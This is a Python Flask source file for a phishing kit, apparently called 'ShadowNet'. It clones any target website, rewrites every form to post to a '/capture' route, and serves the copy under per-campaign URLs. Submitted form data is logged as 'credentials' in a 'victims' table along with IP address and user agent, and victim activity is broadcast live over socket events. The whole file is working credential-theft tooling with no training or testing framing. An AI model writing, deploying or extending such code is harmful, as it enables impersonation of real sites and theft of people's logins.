from flask import Flask, render_template, request, jsonify, redirect, url_for
from flask_socketio import SocketIO, emit
import requests
from bs4 import BeautifulSoup
import sqlite3
import uuid
import os
from config import Config
from datetime import datetime

app = Flask(__name__)
app.config.from_object(Config)
socketio = SocketIO(app, cors_allowed_origins="*")

# Ensure directories exist
os.makedirs('templates', exist_ok=True)
os.makedirs('static/css', exist_ok=True)
os.makedirs('static/js', exist_ok=True)

def init_db():
    conn = sqlite3.connect(app.config['DATABASE'])
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS victims
                      (id TEXT PRIMARY KEY, ip TEXT, user_agent TEXT, credentials TEXT, cookies TEXT, campaign_id TEXT, timestamp TEXT)''')
    conn.commit()
    conn.close()

@app.route('/')
def dashboard():
    return render_template('dashboard.html')

@app.route('/create', methods=['POST'])
def create_phish():
    try:
        # Get URL from form data
        target_url = request.form.get('target_url', '')
        if not target_url:
            return jsonify({'success': False, 'error': 'No URL provided'}), 400

        if not target_url.startswith('http'):
            return jsonify({'success': False, 'error': 'URL must start with http:// or https://'}), 400

        # Fetch the target site
        response = requests.get(target_url, timeout=10)
        response.raise_for_status()
        
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Modify forms to post to our server
        for form in soup.find_all('form'):
            # Change action to our capture endpoint
            form['action'] = '/capture'
            form['method'] = 'POST'
            # Add hidden input for campaign ID
            hidden_input = soup.new_tag('input')
            hidden_input['type'] = 'hidden'
            hidden_input['name'] = 'campaign_id'
            form.append(hidden_input)
        
        # Generate unique ID for this campaign
        campaign_id = str(uuid.uuid4())
        
        # Save the modified HTML
        os.makedirs('templates', exist_ok=True)
        file_path = f'templates/phish_{campaign_id}.html'
        
        with open(file_path, 'w', encoding='utf-8') as f:
            f.write(str(soup))
        
        # Return the URL to the dashboard
        return jsonify({
            'success': True, 
            'url': f'/phish/{campaign_id}',
            'campaign_id': campaign_id
        })

    except requests.exceptions.RequestException as e:
        return jsonify({'success': False, 'error': f'Failed to fetch target: {str(e)}'}), 500
    except Exception as e:
        return jsonify({'success': False, 'error': f'Internal error: {str(e)}'}), 500

@app.route('/phish/<campaign_id>')
def serve_phish(campaign_id):
    # Render the template, NOT the raw HTML
    return render_template('phish_page.html', campaign_id=campaign_id)

@app.route('/get_phishing_page/<campaign_id>')
def get_phishing_page(campaign_id):
    # This route serves the raw cloned HTML
    file_path = f'templates/phish_{campaign_id}.html'
    if os.path.exists(file_path):
        with open(file_path, 'r', encoding='utf-8') as f:
            return f.read()
    return "Page not found", 404

@app.route('/capture', methods=['POST'])
def capture():
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Unknown')
    credentials = request.form.to_dict()
    campaign_id = request.form.get('campaign_id', '')
    
    if not campaign_id:
        return jsonify({'error': 'No campaign ID'}), 400

    victim_id = str(uuid.uuid4())
    timestamp = datetime.now().isoformat()
    
    conn = sqlite3.connect(app.config['DATABASE'])
    cursor = conn.cursor()
    
    # Sanitize data to avoid SQL injection
    credentials_str = str(credentials)
    cursor.execute("INSERT INTO victims VALUES (?, ?, ?, ?, ?, ?, ?)",
                   (victim_id, ip, user_agent, credentials_str, "", campaign_id, timestamp))
    conn.commit()
    conn.close()
    
    # Redirect to original site
    return redirect(request.form.get('redirect', 'https://www.google.com'))

@socketio.on('connect')
def handle_connect():
    emit('status', {'msg': 'Connected to ShadowNet'})

@socketio.on('victim_activity')
def handle_victim_activity(data):
    emit('update', data, broadcast=True)

@socketio.on('permission_granted')
def handle_permission_granted(data):
    emit('permission_update', data, broadcast=True)

if __name__ == '__main__':
    init_db()
    # Use threaded=True for better performance
    socketio.run(app, debug=True, host=app.config['HOST'], port=app.config['PORT'], use_reloader=False)
